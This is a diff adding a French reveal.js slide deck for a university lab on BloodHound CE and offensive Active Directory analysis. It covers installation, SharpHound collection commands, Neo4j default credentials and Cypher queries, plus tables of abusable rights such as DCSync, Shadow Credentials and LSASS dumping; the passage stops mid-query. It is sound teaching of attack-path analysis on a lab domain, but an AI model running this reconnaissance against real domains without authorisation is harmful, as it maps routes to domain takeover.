@@ -1,0 +1,1038 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>TP BloodHound CE - Active Directory Offensif</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/black.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css">
+  <style>
+    .reveal { font-size: 24px; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+    :root { --red:#e63946; --blue:#4cc9f0; --yellow:#ffd60a; --green:#4ade80; --purple:#a855f7; }
+
+    .reveal .slides section {
+      padding: 18px 30px;
+      box-sizing: border-box;
+      overflow: hidden;
+      height: 100%;
+    }
+    .reveal h1, .reveal h2, .reveal h3 {
+      color: var(--blue); text-transform: none; font-weight: 700;
+      letter-spacing: -0.01em; margin-bottom: 0.4em;
+    }
+    .reveal h2 { font-size: 1.3em; }
+    .reveal h3 { font-size: 1.05em; color: var(--yellow); }
+    .reveal .slides section { text-align: left; }
+    .reveal .slides section.ctr { text-align: center; }
+    .reveal strong { color: var(--yellow); }
+    .reveal em     { color: var(--blue); font-style: normal; }
+    .reveal li   { margin-bottom: 0.35em; line-height: 1.55; }
+    .reveal p    { line-height: 1.55; margin-bottom: 0.3em; }
+    .reveal ul ul { font-size: 0.9em; margin-top: 0.15em; }
+
+    .reveal table { font-size:0.6em; border-collapse:collapse; width:100%; table-layout:fixed; }
+    .reveal table th { color:var(--blue); border-bottom:1px solid #444; padding:0.35em 0.5em; text-align:left; font-weight:600; }
+    .reveal table td { padding:0.3em 0.5em; border-bottom:1px solid #222; vertical-align:top; word-break:break-word; }
+    .reveal table tr:last-child td { border-bottom:none; }
+    .reveal table code { font-size:0.82em; background:#1e2330; padding:1px 3px; border-radius:2px; color:var(--blue); }
+
+    .reveal pre { width:100%; font-size:0.54em; box-shadow:none; border-radius:6px; margin:0.4em 0; }
+    .reveal pre code { max-height:280px; border-radius:6px; padding:0.7em 0.9em; }
+    .reveal code:not([class]) { background:#1e2330; padding:1px 5px; border-radius:3px; color:var(--blue); font-size:0.84em; }
+
+    .hlbox   { border-left:3px solid var(--red);    padding:0.4em 0.75em; background:rgba(230,57,70,0.12);  border-radius:0 4px 4px 0; margin:0.4em 0; font-size:0.9em; line-height:1.5; }
+    .infobox { border-left:3px solid var(--blue);   padding:0.4em 0.75em; background:rgba(76,201,240,0.1);  border-radius:0 4px 4px 0; margin:0.4em 0; font-size:0.9em; line-height:1.5; }
+    .warnbox { border-left:3px solid var(--yellow); padding:0.4em 0.75em; background:rgba(255,214,10,0.08); border-radius:0 4px 4px 0; margin:0.4em 0; font-size:0.9em; line-height:1.5; }
+    .greenbox{ border-left:3px solid var(--green);  padding:0.4em 0.75em; background:rgba(74,222,128,0.08); border-radius:0 4px 4px 0; margin:0.4em 0; font-size:0.9em; line-height:1.5; }
+
+    .two-col   { display:grid; grid-template-columns:1fr 1fr;     gap:0.5em 1.5em; }
+    .three-col { display:grid; grid-template-columns:1fr 1fr 1fr; gap:0.5em 1em;  }
+
+    .mbox { font-size:0.68em; background:#0d1117; border-radius:6px; padding:0.7em 0.9em;
+            font-family:'Cascadia Code','Fira Code','Consolas',monospace; line-height:1.8; margin:0.4em 0; }
+    .mc { color:#4cc9f0; } .my { color:#ffd60a; } .mr { color:#e63946; }
+    .mg { color:#666; }    .mw { color:#ccc; }    .ms { color:#4ade80; } .mp { color:#a855f7; }
+
+    .exo { border:1px solid #333; border-radius:6px; padding:0.45em 0.75em; margin:0.3em 0; background:#0d1117; }
+    .exo-title { font-size:0.68em; letter-spacing:0.12em; text-transform:uppercase; color:var(--yellow); font-weight:700; margin-bottom:0.2em; }
+    .exo-body  { font-size:0.85em; line-height:1.6; }
+    .hint { font-size:0.74em; color:#888; border-top:1px solid #222; margin-top:0.3em; padding-top:0.3em; }
+    .hint::before { content:"Indice → "; color:#555; }
+
+    .copyright { position:fixed; bottom:7px; right:12px; font-size:0.4em; color:#444; z-index:200; font-family:monospace; letter-spacing:0.05em; }
+    .part-number { font-size:0.58em; color:var(--red); letter-spacing:0.28em; text-transform:uppercase; margin-bottom:0.3em; font-family:monospace; }
+    .tag   { display:inline-block; background:var(--red);    color:#fff; font-size:0.55em; padding:1px 7px; border-radius:10px; vertical-align:middle; letter-spacing:0.05em; }
+    .tag-b { background:#2563eb; }
+    .tag-g { background:#16a34a; }
+    .sub   { color:#888; font-size:0.8em; margin:0; }
+  </style>
+</head>
+<body>
+<div class="copyright">© Volker Carstein - Parabellum Services</div>
+<div class="reveal"><div class="slides">
+
+
+<!-- =====================================================================
+     TITRE
+     ===================================================================== -->
+<section class="ctr" data-background-gradient="linear-gradient(135deg,#0d1117 0%,#161b22 60%,#1a1a2e 100%)">
+  <div style="border:2px solid #4cc9f0;padding:1.8em 2.5em;border-radius:10px;display:inline-block;min-width:72%;">
+    <p style="color:#4cc9f0;font-size:0.55em;letter-spacing:0.3em;text-transform:uppercase;margin:0 0 0.4em;">IUT Aix-Marseille Université - AD Offensif</p>
+    <h1 style="color:#fff;font-size:1.7em;margin:0 0 0.2em;">TP BloodHound CE</h1>
+    <h2 style="color:#4cc9f0;font-size:1.0em;margin:0 0 1em;letter-spacing:0.05em;">Analyse offensive d'un domaine Active Directory</h2>
+    <hr style="border:none;border-top:1px solid #333;margin:0.7em 0;">
+    <p style="font-size:0.55em;color:#aaa;margin:0.3em 0;">Volker Carstein &nbsp;|&nbsp; Parabellum Services</p>
+    <p style="font-size:0.45em;color:#555;margin:0;">Domaine LAB.LOCAL - BadBlood + SharpHound</p>
+  </div>
+</section>
+
+
+<section>
+  <h2>Plan du TP</h2>
+  <div class="two-col" style="margin-top:0.3em;font-size:0.92em;">
+    <div>
+      <p style="color:#a855f7;font-weight:bold;margin-bottom:0.25em;">Présentation de BloodHound CE</p>
+      <ul style="font-size:0.88em;">
+        <li>Rôle et architecture</li>
+        <li>Installation via BloodHound CLI</li>
+        <li>Collecte SharpHound, ingestion</li>
+      </ul>
+      <p style="color:var(--blue);font-weight:bold;margin:0.5em 0 0.25em;">Partie A - Interface &amp; Cypher</p>
+      <ul style="font-size:0.88em;">
+        <li>Noeuds, arêtes, navigation</li>
+        <li>Langage Cypher - de zéro à l'autonomie</li>
+        <li>Exercices très guidés (15 exercices)</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;margin-bottom:0.25em;">Partie B - Reconnaissance offensive</p>
+      <ul style="font-size:0.88em;">
+        <li>Identifier les comptes vulnérables</li>
+        <li>Cartographier les chemins d'attaque</li>
+        <li>Analyser les ACE mal configurées</li>
+      </ul>
+      <p style="color:var(--red);font-weight:bold;margin:0.5em 0 0.25em;">Partie C - Les 7 Samouraïs <span class="tag">synthèse</span></p>
+      <ul style="font-size:0.88em;">
+        <li>Reconstituer une chaîne de 7 comptes jusqu'au Domain Admin</li>
+        <li>6 techniques à identifier</li>
+      </ul>
+    </div>
+  </div>
+  <div class="infobox" style="margin-top:0.5em;">
+    Ce TP est centré sur l'<strong>analyse BloodHound</strong>. Tous les exercices s'effectuent uniquement depuis l'interface BloodHound CE - aucun contact avec le DC n'est nécessaire.
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PRÉSENTATION BLOODHOUND CE
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#1a0030 0%,#2d0060 100%)" class="ctr">
+  <p class="part-number" style="color:#a855f7;">BloodHound CE</p>
+  <h1 style="color:#fff;font-size:1.8em;">Présentation</h1>
+  <p style="color:#a855f7;font-size:0.9em;">Rôle · Architecture · Installation · Collecte</p>
+</section>
+
+
+<section>
+  <h2>BloodHound CE - Rôle</h2>
+  <ul>
+    <li>BloodHound est un outil d'<strong>analyse des chemins d'attaque</strong> dans Active Directory (et Azure AD). Il représente le domaine comme un <strong>graphe orienté</strong> : les objets AD sont des noeuds, les relations entre eux sont des arêtes.</li>
+    <li>Son originalité : il visualise des chemins d'escalade de privilèges <em>non évidents</em>. Une chaîne de 5 délégations de droits peut mener à un Domain Admin alors qu'aucune permission individuelle ne semble critique.</li>
+    <li><strong>BloodHound CE</strong> (Community Edition) est la version open-source maintenue par SpecterOps depuis 2023. Elle remplace l'ancienne version standalone et introduit une interface web, une API REST et une architecture microservices (Docker).</li>
+    <li>Usage dual : outil offensif pour les pentesters / red teamers, outil défensif pour les administrateurs qui souhaitent cartographier leur surface d'attaque avant un attaquant.</li>
+  </ul>
+  <div class="infobox">
+    Source : <strong>github.com/SpecterOps/BloodHound</strong> - licence Apache 2.0
+  </div>
+</section>
+
+
+<section>
+  <h2>Architecture BloodHound CE</h2>
+  <div class="mbox">
+    <p class="my">① Collecte &nbsp;&nbsp;&nbsp; SharpHound.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ &nbsp;fichiers JSON (.zip)</p>
+    <p class="mc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ou AzureHound pour Azure AD)</p>
+    <p class="my">② Ingestion &nbsp;&nbsp; Interface web BH CE &nbsp;→ &nbsp;import ZIP → Neo4j</p>
+    <p class="my">③ Stockage &nbsp;&nbsp;&nbsp; Neo4j (base graphe) &nbsp;&nbsp;= &nbsp;noeuds + relations AD</p>
+    <p class="my">④ Analyse &nbsp;&nbsp;&nbsp;&nbsp; Interface web BH CE &nbsp;→ &nbsp;graphe interactif + Cypher</p>
+  </div>
+  <div class="two-col" style="font-size:0.88em;margin-top:0.3em;">
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;margin-bottom:0.2em;">SharpHound (collecteur)</p>
+      <ul>
+        <li>Agent C# - s'exécute depuis n'importe quelle session utilisateur du domaine</li>
+        <li>Collecte via LDAP : utilisateurs, groupes, GPO, OUs, ACL, délégations</li>
+        <li>Collecte via SMB : sessions actives sur les machines (NetSessionEnum)</li>
+        <li>Génère un fichier ZIP contenant plusieurs JSON</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;margin-bottom:0.2em;">BloodHound CE (analyse)</p>
+      <ul>
+        <li>Interface web React - accessible sur <code>localhost:8080</code></li>
+        <li>Backend Go + base Neo4j dans des conteneurs Docker</li>
+        <li>Requêtes Cypher natives sur Neo4j via l'onglet Raw Query</li>
+        <li>Chemins prédéfinis + chemins personnalisés</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Installation - BloodHound CLI (Linux)</h2>
+  <p class="sub" style="margin-bottom:0.35em;">Prérequis : <strong>Docker Desktop</strong> installé et démarré - <a href="https://www.docker.com/get-started" style="color:var(--blue);">docker.com/get-started</a></p>
+  <pre><code class="language-bash"># 1. Télécharger le CLI
+wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
+
+# 2. Extraire
+tar -xvzf bloodhound-cli-linux-amd64.tar.gz
+
+# 3. Lancer l'installation (télécharge et démarre les conteneurs Docker)
+./bloodhound-cli install</code></pre>
+  <div class="greenbox" style="font-size:0.88em;margin-top:0.3em;">
+    En fin d'installation, le CLI affiche le mot de passe admin généré aléatoirement :<br>
+    <code style="color:var(--green);">[+] BloodHound is ready to go!</code><br>
+    <code style="color:var(--green);">[+] You can log in as `admin` with this password: &lt;Password&gt;</code>
+  </div>
+  <div class="infobox" style="margin-top:0.3em;font-size:0.88em;">
+    Interface : <strong>http://localhost:8080/ui/login</strong> &nbsp;|&nbsp; Login : <code>admin</code> &nbsp;|&nbsp; MDP ci-dessus &nbsp;|&nbsp; Changement obligatoire à la 1ère connexion.<br>
+    Mise à jour : <code>./bloodhound-cli update</code> &nbsp;&nbsp;|&nbsp;&nbsp; MDP oublié : <code>./bloodhound-cli resetpwd</code>
+  </div>
+  <div class="warnbox" style="font-size:0.83em;">
+    Prérequis : <strong>8 Go RAM minimum</strong>, 4 cœurs, 10 Go disque. Prévoir ~1 min après le démarrage avant que l'interface soit opérationnelle (analyse initiale du graphe).
+  </div>
+</section>
+
+
+<section>
+  <h2>Collecte SharpHound &amp; Ingestion</h2>
+  <pre><code class="language-powershell"># Lancer SharpHound depuis une session utilisateur du domaine (Windows)
+# Collecte complète : LDAP + sessions + ACL + GPO
+.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\BH
+
+# Collecte ciblée : LDAP uniquement (sans sessions - moins de bruit réseau)
+.\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory C:\Temp\BH
+
+# Résultat : un fichier ZIP type 20240101120000_BloodHound.zip
+# contenant : *_users.json, *_computers.json, *_groups.json, *_domains.json,
+#             *_gpos.json, *_ous.json, *_containers.json</code></pre>
+  <ul style="margin-top:0.3em;font-size:0.9em;">
+    <li><strong>Ingestion dans BloodHound CE</strong> : menu hamburger → <em>Upload Files</em> → glisser-déposer le ZIP SharpHound → attendre la fin du traitement (barre de progression).</li>
+  </ul>
+  <div class="greenbox" style="font-size:0.87em;">
+    <strong>Pour ce TP :</strong> l'enseignant vous fournit un fichier ZIP issu de SharpHound. Ingérez-le dans votre instance BloodHound CE locale avant de commencer les exercices. Le domaine <code>LAB.LOCAL</code> (~2 500 objets) doit apparaître dans l'interface après l'import.
+  </div>
+</section>
+
+
+<section>
+  <h2>Interface BloodHound CE - Vue d'ensemble</h2>
+  <div class="two-col">
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;font-size:0.9em;margin-bottom:0.3em;">Éléments de l'interface</p>
+      <ul style="font-size:0.88em;">
+        <li><strong>Barre de recherche</strong> (haut) : trouver un objet par nom → cliquer → afficher dans le graphe</li>
+        <li><strong>Panneau latéral</strong> (clic sur noeud) : Properties, Outbound Object Control, Inbound Object Control, Group Memberships</li>
+        <li><strong>Menu Pathfinding</strong> : chemins prédéfinis</li>
+        <li><strong>Onglet Cypher</strong> (Raw Query) : exécuter directement des requêtes Neo4j</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;font-size:0.9em;margin-bottom:0.3em;">Commandes utiles dans le graphe</p>
+      <ul style="font-size:0.88em;">
+        <li>Clic sur noeud → panneau Properties</li>
+        <li>Clic droit → <em>Shortest Paths from Here</em></li>
+        <li>Clic droit → <em>Shortest Paths to Here</em></li>
+        <li>Clic sur arête → type de relation + explication</li>
+        <li>Ctrl+scroll = zoom, clic maintenu = déplacer</li>
+      </ul>
+      <div class="infobox" style="font-size:0.84em;margin-top:0.4em;">
+        Cliquer sur une arête dans BloodHound affiche une description de la technique d'exploitation associée - utile pour comprendre le chemin d'attaque.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     NEO4J BROWSER
+     ===================================================================== -->
+<section>
+  <h2>Neo4j Browser - Requêtes tabulaires</h2>
+  <p class="sub" style="margin-bottom:0.35em;">BloodHound CE ne visualise que les <strong>noeuds</strong> et les <strong>chemins</strong>. Pour tout le reste - comptages, listes, propriétés scalaires - on utilise <strong>Neo4j Browser</strong>, l'interface native de la base de données.</p>
+  <div class="two-col" style="font-size:0.9em;margin-bottom:0.4em;">
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;font-size:0.9em;margin-bottom:0.3em;">Connexion</p>
+      <div class="mbox" style="font-size:0.82em;">
+        <p class="my">URL &nbsp;&nbsp;&nbsp; http://localhost:7474</p>
+        <p class="my">Login &nbsp;&nbsp; neo4j</p>
+        <p class="my">MDP &nbsp;&nbsp;&nbsp; bloodhoundcommunityedition</p>
+        <p class="mc" style="margin-top:0.4em;">Connecter via Bolt : bolt://localhost:7687</p>
+      </div>
+      <div class="warnbox" style="font-size:0.82em;margin-top:0.35em;">
+        Neo4j Browser n'est accessible que si les conteneurs Docker de BloodHound CE sont démarrés (<code>./bloodhound-cli start</code>).
+      </div>
+    </div>
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;font-size:0.9em;margin-bottom:0.3em;">Quand utiliser quoi ?</p>
+      <table style="font-size:0.82em;">
+        <thead><tr><th>Besoin</th><th>Interface</th></tr></thead>
+        <tbody>
+          <tr><td>Visualiser un noeud / un chemin dans le graphe</td><td style="color:var(--green);">BloodHound CE</td></tr>
+          <tr><td>Compter des objets (<code>count</code>)</td><td style="color:var(--blue);">Neo4j Browser</td></tr>
+          <tr><td>Lister des noms (<code>RETURN n.name</code>)</td><td style="color:var(--blue);">Neo4j Browser</td></tr>
+          <tr><td>Agréger, trier, collecter</td><td style="color:var(--blue);">Neo4j Browser</td></tr>
+          <tr><td>Requêtes offensives Part B/C</td><td style="color:var(--green);">BloodHound CE</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <div class="infobox" style="font-size:0.85em;">
+    Dans Neo4j Browser : coller la requête dans la barre en haut → <kbd>Ctrl+Entrée</kbd> ou clic sur le bouton ▶. Les résultats scalaires s'affichent en tableau sous la barre de requête. Passer en vue "Table" si nécessaire (onglet en haut à droite du résultat).
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE A - INTERFACE + CYPHER
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#000020 0%,#00004a 100%)" class="ctr">
+  <p class="part-number">Partie A</p>
+  <h1 style="color:#fff;font-size:1.8em;">Interface &amp; Cypher</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Noeuds · Arêtes · Langage de requêtes Neo4j</p>
+</section>
+
+
+<section>
+  <h2>Noeuds - Types et propriétés clés</h2>
+  <table>
+    <thead><tr><th style="width:12%;">Type</th><th style="width:22%;">Propriétés clés</th><th>Exemples de valeurs</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><code>User</code></td>
+        <td><code>name</code> <code>enabled</code> <code>dontreqpreauth</code> <code>hasspn</code> <code>admincount</code> <code>pwdneverexpires</code></td>
+        <td><code>'MARIE_CANTRELL@LAB.LOCAL'</code> - format toujours <strong>SAM@DOMAINE en majuscules</strong></td>
+      </tr>
+      <tr>
+        <td><code>Computer</code></td>
+        <td><code>name</code> <code>enabled</code> <code>unconstraineddelegation</code> <code>operatingsystem</code></td>
+        <td><code>'DC01.LAB.LOCAL'</code> - les machines ont toujours le <code>$</code> dans AD mais pas dans BloodHound</td>
+      </tr>
+      <tr>
+        <td><code>Group</code></td>
+        <td><code>name</code> <code>admincount</code></td>
+        <td><code>'DOMAIN ADMINS@LAB.LOCAL'</code></td>
+      </tr>
+      <tr>
+        <td><code>Domain</code></td>
+        <td><code>name</code> <code>functionallevel</code></td>
+        <td><code>'LAB.LOCAL'</code></td>
+      </tr>
+      <tr>
+        <td><code>GPO</code></td>
+        <td><code>name</code> <code>gpcpath</code></td>
+        <td>Objets de stratégie de groupe</td>
+      </tr>
+      <tr>
+        <td><code>OU</code></td>
+        <td><code>name</code> <code>distinguishedname</code></td>
+        <td>Unités d'organisation</td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="warnbox" style="margin-top:0.4em;font-size:0.87em;">
+    Toujours utiliser le format complet <code>'NOM@DOMAINE'</code> en majuscules pour les noms dans les requêtes Cypher. Exemple : <code>'MARIE_CANTRELL@LAB.LOCAL'</code> et non <code>'MARIE_CANTRELL'</code>.
+  </div>
+</section>
+
+
+<section>
+  <h2>Arêtes - Droits offensifs</h2>
+  <table>
+    <thead><tr><th>Arête BloodHound</th><th>Nom Microsoft (ADUC)</th><th>Impact sur la cible</th></tr></thead>
+    <tbody>
+      <tr><td><code>GenericAll</code></td><td>Full Control / Generic All</td><td>Contrôle total - reset MDP, modifier attributs, Shadow Credentials</td></tr>
+      <tr><td><code>GenericWrite</code></td><td>Generic Write</td><td>Modifier attributs non protégés (SPN, description, logon script...)</td></tr>
+      <tr><td><code>WriteDACL</code></td><td>Modify permissions (WRITE_DAC)</td><td>Réécrire la DACL → s'attribuer n'importe quel droit</td></tr>
+      <tr><td><code>WriteOwner</code></td><td>Modify owner (WRITE_OWNER)</td><td>Prendre la propriété → WRITE_DAC implicite → GenericAll</td></tr>
+      <tr><td><code>ForceChangePassword</code></td><td>Reset password (User-Force-Change-Password)</td><td>Réinitialiser le MDP sans connaître l'actuel</td></tr>
+      <tr><td><code>AllExtendedRights</code></td><td>All Extended Rights</td><td>Reset MDP + LAPS + DCSync (si sur Domain)</td></tr>
+      <tr><td><code>DCSync</code></td><td>DS-Replication-Get-Changes-All</td><td>Répliquer tous les hashes du domaine</td></tr>
+      <tr><td><code>AddMember</code></td><td>Add/remove self as member</td><td>S'ajouter à un groupe</td></tr>
+      <tr><td><code>AddKeyCredentialLink</code></td><td>Write msDS-KeyCredentialLink</td><td>Shadow Credentials - ajouter une clé publique contrôlée → authentification PKINIT sans changer le MDP</td></tr>
+      <tr><td><code>WriteSPN</code></td><td>WriteProperty sur servicePrincipalName uniquement</td><td>Targeted Kerberoasting - ajouter un SPN sur un compte. Sous-ensemble de GenericWrite : Shadow Credentials impossible</td></tr>
+    </tbody>
+  </table>
+</section>
+
+
+<section>
+  <h2>Arêtes - Relations structurelles</h2>
+  <table>
+    <thead><tr><th>Arête</th><th>Signification</th><th>Intérêt offensif</th></tr></thead>
+    <tbody>
+      <tr><td><code>MemberOf</code></td><td>Appartient à un groupe</td><td>Hérite des droits du groupe - peut créer une chaîne indirecte</td></tr>
+      <tr><td><code>AdminTo</code></td><td>Administrateur local sur la machine</td><td>Peut dumper LSASS → hashes des sessions actives</td></tr>
+      <tr><td><code>HasSession</code></td><td>Utilisateur a une session active sur la machine</td><td>Si l'attaquant est admin sur la machine → dump session → hash</td></tr>
+      <tr><td><code>Contains</code></td><td>OU / Domain contient l'objet</td><td>Héritage de GPO ou d'ACE sur l'OU parente</td></tr>
+      <tr><td><code>GpLink</code></td><td>GPO liée à une OU</td><td>GPO avec script → exécution sur toutes les machines de l'OU</td></tr>
+      <tr><td><code>AllowedToDelegate</code></td><td>Délégation contrainte configurée</td><td>S4U2Proxy → impersonation vers service cible</td></tr>
+      <tr><td><code>AllowedToAct</code></td><td>RBCD configuré (msDS-AllowedToActOnBehalfOfOtherIdentity)</td><td>RBCD → S4U2Self → impersonation vers machine</td></tr>
+      <tr><td><code>TrustedBy</code></td><td>Relation de confiance entre domaines</td><td>Mouvement inter-domaines</td></tr>
+    </tbody>
+  </table>
+</section>
+
+
+<!-- =====================================================================
+     CYPHER - COURS COMPLET
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#001a00 0%,#003300 100%)" class="ctr">
+  <p class="part-number" style="color:var(--green);">Cypher</p>
+  <h1 style="color:#fff;font-size:1.7em;">Le langage de requêtes Neo4j</h1>
+  <p style="color:var(--green);font-size:0.85em;">De zéro à l'autonomie - cours complet</p>
+</section>
+
+
+<section>
+  <h2>Cypher - Concept de base</h2>
+  <p class="sub" style="margin-bottom:0.3em;">Cypher est à Neo4j ce que SQL est à MySQL. Sa syntaxe est <em>visuelle</em> : elle représente les patterns du graphe tels qu'on les dessinerait.</p>
+  <div class="warnbox" style="font-size:0.83em;margin-bottom:0.4em;">
+    <strong>Deux interfaces :</strong> <strong style="color:var(--green);">BloodHound CE Raw Query</strong> pour visualiser des noeuds/chemins (<code>RETURN n</code>, <code>RETURN p</code>) - <strong style="color:var(--blue);">Neo4j Browser</strong> (<code>localhost:7474</code>) pour tout ce qui retourne des scalaires (<code>count</code>, <code>n.name</code>, listes…). Voir slide précédente.
+  </div>
+  <div class="two-col">
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;font-size:0.9em;margin-bottom:0.25em;">Notation des noeuds</p>
+      <pre><code class="language-cypher">(n)              -- noeud quelconque
+(n:User)         -- noeud de type User
+(n:User {enabled: true})
+                 -- noeud User avec propriété
+(n:User {name: 'ADMIN@DOMAIN'})</code></pre>
+    </div>
+    <div>
+      <p style="color:var(--yellow);font-weight:bold;font-size:0.9em;margin-bottom:0.25em;">Notation des relations</p>
+      <pre><code class="language-cypher">(a)-[r]->(b)          -- relation quelconque
+(a)-[:MemberOf]->(b)  -- relation typée
+(a)-[r:MemberOf]->(b) -- capturée dans r
+(a)<-[:AdminTo]-(b)   -- direction inversée
+(a)-[:REL]-(b)        -- non dirigée</code></pre>
+    </div>
+  </div>
+  <div class="infobox" style="margin-top:0.3em;font-size:0.88em;">
+    La structure d'une requête Cypher suit toujours l'ordre : <strong>MATCH</strong> (trouver le motif) → <strong>WHERE</strong> (filtrer) → <strong>RETURN</strong> (retourner les résultats). Les autres clauses sont optionnelles.
+  </div>
+</section>
+
+
+<section>
+  <h2>Cypher - MATCH et labels</h2>
+  <pre><code class="language-cypher">-- [BH CE + Neo4j Browser] Tous les noeuds d'un type - s'affichent dans le graphe BH
+MATCH (n:User)     RETURN n LIMIT 10
+MATCH (n:Computer) RETURN n LIMIT 10
+MATCH (n:Group)    RETURN n LIMIT 10
+
+-- [Neo4j Browser uniquement] Retourner des propriétés scalaires
+MATCH (n:User) RETURN n.name, n.enabled LIMIT 10
+
+-- [Neo4j Browser uniquement] Compter les résultats
+MATCH (n:User) RETURN count(n)
+
+-- [Neo4j Browser uniquement] Voir quels labels (types) existent dans la base
+MATCH (n) RETURN DISTINCT labels(n)</code></pre>
+  <div class="warnbox" style="font-size:0.87em;margin-top:0.3em;">
+    <strong>Toujours mettre un LIMIT</strong> sur les premières requêtes. Une base BloodHound peut contenir des milliers de noeuds - sans LIMIT, l'affichage est inutilisable et peut ralentir Neo4j.
+  </div>
+</section>
+
+
+<section>
+  <h2>Cypher - WHERE et filtres</h2>
+  <pre><code class="language-cypher">-- [Neo4j Browser] Égalité - retourne des noms (scalaires)
+MATCH (n:User) WHERE n.enabled = TRUE RETURN n.name
+
+-- [BH CE] Même filtre mais retourne le noeud entier - s'affiche dans le graphe
+MATCH (n:User) WHERE n.enabled = TRUE RETURN n LIMIT 20
+
+-- [Neo4j Browser] Plusieurs conditions
+MATCH (n:User)
+WHERE n.enabled = TRUE AND n.dontreqpreauth = TRUE
+RETURN n.name, n.admincount
+
+-- [BH CE + Neo4j Browser] Opérateur IN - RETURN n s'affiche dans le graphe BH
+MATCH (n:User) WHERE n.name IN ['ALICE@LAB.LOCAL', 'BOB@LAB.LOCAL'] RETURN n
+
+-- [Neo4j Browser] Fonctions sur les chaînes
+MATCH (n:User) WHERE toLower(n.name) STARTS WITH 'marie' RETURN n.name
+MATCH (n:User) WHERE n.name CONTAINS 'ADMIN' RETURN n.name
+
+-- [Neo4j Browser] Propriété existante (non nulle)
+MATCH (n:User) WHERE n.description IS NOT NULL RETURN n.name, n.description
+
+-- [Neo4j Browser] Ordonner et paginer
+MATCH (n:User) WHERE n.enabled = TRUE
+RETURN n.name ORDER BY n.name LIMIT 20</code></pre>
+</section>
+
+
+<section>
+  <h2>Cypher - Agrégations</h2>
+  <p class="sub" style="color:#888;font-size:0.78em;margin-bottom:0.2em;">Toutes les requêtes de cette slide retournent des scalaires → <strong>Neo4j Browser uniquement</strong></p>
+  <pre><code class="language-cypher">-- Compter tous les utilisateurs activés
+MATCH (n:User) WHERE n.enabled = TRUE
+RETURN count(n) AS nb_users
+
+-- Compter les valeurs distinctes
+MATCH (n:User) RETURN count(DISTINCT n.enabled) AS nb_valeurs_enabled
+
+-- Regrouper : compter les membres par groupe
+MATCH (u:User)-[:MemberOf]->(g:Group)
+RETURN g.name, count(u) AS nb_membres
+ORDER BY nb_membres DESC LIMIT 15
+
+-- Collecter les valeurs dans une liste
+MATCH (u:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
+RETURN collect(u.name) AS membres_DA
+
+-- Taille d'une liste / d'un chemin
+MATCH (u:User)-[:MemberOf]->(g:Group)
+WITH g, count(u) AS nb WHERE nb > 50
+RETURN g.name, nb</code></pre>
+  <div class="infobox" style="font-size:0.87em;">
+    <code>count(n)</code> compte les noeuds. <code>collect(n.name)</code> crée une liste. <code>WITH</code> permet de filtrer sur un résultat agrégé - équivalent du <code>HAVING</code> en SQL.
+  </div>
+</section>
+
+
+<section>
+  <h2>Cypher - Traverser les relations</h2>
+  <pre><code class="language-cypher">-- [Neo4j Browser] Relation directe - retourne paires de noms
+MATCH (u:User)-[:MemberOf]->(g:Group) RETURN u.name, g.name LIMIT 20
+
+-- [Neo4j Browser] Capturer le type de la relation
+MATCH (a)-[r]->(b:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
+RETURN a.name, type(r), labels(a)
+
+-- [BH CE + Neo4j Browser] Plusieurs types - RETURN src,dst affiche les noeuds dans BH
+MATCH (src)-[r:GenericAll|WriteDACL|WriteOwner]->(dst)
+RETURN src, dst LIMIT 30
+
+-- [Neo4j Browser] Même requête avec noms et type de droit (scalaires)
+MATCH (src)-[r:GenericAll|WriteDACL|WriteOwner]->(dst)
+RETURN src.name, type(r) AS droit, dst.name, labels(src), labels(dst)
+LIMIT 30
+
+-- [Neo4j Browser] Relation récursive : membres directs ET indirects
+MATCH (u:User)-[:MemberOf*1..]->(g:Group)
+WHERE g.name = 'DOMAIN ADMINS@LAB.LOCAL'
+RETURN u.name</code></pre>
+</section>
+
+
+<section>
+  <h2>Cypher - Chemins et shortestPath</h2>
+  <pre><code class="language-cypher">-- Chemin le plus court entre deux noeuds (n'importe quel type de relation)
+MATCH p = shortestPath(
+  (start:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[*1..10]->(end:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
+)
+RETURN p
+
+-- Extraire les noeuds et les types de relations d'un chemin
+MATCH p = shortestPath(
+  (start:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[*1..10]->(end:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
